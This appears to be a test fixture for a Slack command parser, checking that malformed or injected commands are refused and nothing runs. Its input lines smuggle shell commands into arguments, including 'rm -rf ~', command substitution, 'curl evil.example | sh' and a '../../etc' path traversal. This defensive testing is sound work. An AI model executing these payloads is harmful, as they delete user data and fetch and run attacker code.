---
id: H10
surfaces: slack
expect: refused=clean
cite: slack_commands_listen.parse_command: structured grammar, an unknown or malformed command is refused with a reply and nothing runs. One message per line.
---
--merge x; rm -rf ~
--merge $(touch /tmp/pwned)
--merge `id`
--rebase a && curl evil.example | sh
--help; echo hi
--unsafe-merge 'unterminated
--list 1 | tee /tmp/x
--merge ../../etc
